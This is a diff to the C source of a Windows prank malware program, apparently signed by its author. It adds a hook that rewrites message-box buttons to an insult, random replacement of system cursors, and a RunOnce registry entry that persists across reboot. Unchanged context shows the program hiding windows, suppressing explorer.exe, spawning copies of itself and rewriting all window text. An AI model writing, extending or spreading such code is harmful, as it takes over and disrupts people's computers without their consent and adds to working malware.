@@ -47,6 +47,14 @@ int Random()
 	return out & 0x7FFFFFFF;
 }
 
+LPSTR StrCat(LPSTR a, LPSTR b)
+{
+	LPSTR ret = (char*)LocalAlloc(LMEM_ZEROINIT, 16384);
+	lstrcpyA(ret, a);
+	lstrcatA(ret, b); //Concatenate strings without modifying them
+	return ret;
+}
+
 int __stdcall LolText(HWND hwnd, LPARAM lParam)
 {
 	LPWSTR text = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(wchar_t) * 8192);
@@ -93,7 +101,7 @@ LRESULT __stdcall LolBtn(int nCode, WPARAM wParam, LPARAM lParam)
 				break;
 			}
 			
-			SetWindowTextA(btn, LOL); //Change message box every button text to "lol"
+			SetWindowTextA(btn, LOL); //Change every message box button text to "lol"
 		}
 	}
 
@@ -115,6 +123,25 @@ LRESULT __stdcall MoveMsg(int nCode, WPARAM wParam, LPARAM lParam)
 
 			pcs->x = x;
 			pcs->y = y; //Move message box randomly
+		}
+	}
+
+	return CallNextHookEx(0, nCode, wParam, lParam);
+}
+
+LRESULT __stdcall FckBtn(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode < 0)
+		return CallNextHookEx(0, nCode, wParam, lParam);
+
+	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;
+
+	if (msg->message == WM_INITDIALOG)
+	{
+		for (int i = 0; i < 10; i++)
+		{
+			HWND btn = GetDlgItem(msg->hwnd, i);
+			SetWindowTextA(btn, "fck u"); //Change every message box button text to "fck u"
 		}
 	}
 
@@ -154,6 +181,7 @@ DWORD __stdcall SpamSound(void*)
 	return 0;
 }
 
+LPWSTR cursors[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
 DWORD __stdcall CursorMess(void*)
 {
 	while (!stop)
@@ -163,11 +191,17 @@ DWORD __stdcall CursorMess(void*)
 	}
 
 	HDC scrnDc = GetDC(0);
+	int p = 0;
 	while (true)
 	{
 		POINT pt;
 		GetCursorPos(&pt);
 		DrawIcon(scrnDc, pt.x, pt.y, LoadIconW(0, IDI_ERROR)); //Draw error icons
+
+		//Set random cursors
+		for (int i = 0; i < 200; i++)
+			SetSystemCursor(LoadCursorW(0, cursors[Random() % 15]), 32500 + i);
+
 		Sleep(69);
 	}
 }
@@ -202,7 +236,7 @@ void MessUp()
 {
 	SendMessageA(HWND_BROADCAST, WM_SHOWWINDOW, 0, 1); //Hide all windows
 	CreateThread(0, 0, SuppressFileExplorer, 0, 0, 0); //Keep suppressing explorer.exe
-	
+
 	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
 	GetModuleFileNameA(0, exePath, 8192);
 
@@ -216,7 +250,7 @@ void MessUp()
 	RtlZeroMemory(&pi, sizeof(pi));
 
 	for (int i = 0; i < 10; i++)
-		CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
+		CreateProcessA(0, StrCat(exePath, (LPSTR)" lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
 }
 
 int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
@@ -248,9 +282,25 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 
 			return 0;
 		}
+		else if (lstrcmpA(__argv[1], "safe") == 0)
+		{
+			//Message box after reboot
+			HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, FckBtn, 0, GetCurrentThreadId());
+			MessageBoxA(0, "Don't worry ur pc is safe, dude.\nHope u didn't smash ur monitor!\n\nCrafted by AleXandro-1337", LOL, MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+			UnhookWindowsHookEx(hook);
 
-	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
+			return 0;
+		}
+		else return 0;
+
+	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 16384);
 	GetModuleFileNameA(0, exePath, 8192);
+
+	HKEY safeMsg;
+	LPSTR keyValue = StrCat(exePath, (LPSTR)" safe\0");
+	RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, 0, 0, KEY_ALL_ACCESS, 0, &safeMsg, 0);
+	RegSetValueExA(safeMsg, "lol", 0, REG_SZ, (LPBYTE)keyValue, lstrlenA(keyValue) + 1); //Tell user on startup that it was a joke =D
+	RegCloseKey(safeMsg);
 
 	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
@@ -259,7 +309,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 	si.cb = sizeof(si);
 	RtlZeroMemory(&pi, sizeof(pi));
 
-	CreateProcessA(0, lstrcatA(exePath, " msg"), 0, 0, 0, 0, 0, 0, &si, &pi);
+	CreateProcessA(0, StrCat(exePath, (LPSTR)" msg"), 0, 0, 0, 0, 0, 0, &si, &pi);
 
 	EnumChildWindows(GetDesktopWindow(), &LolText, 0); //Change all text to "lol"
 	
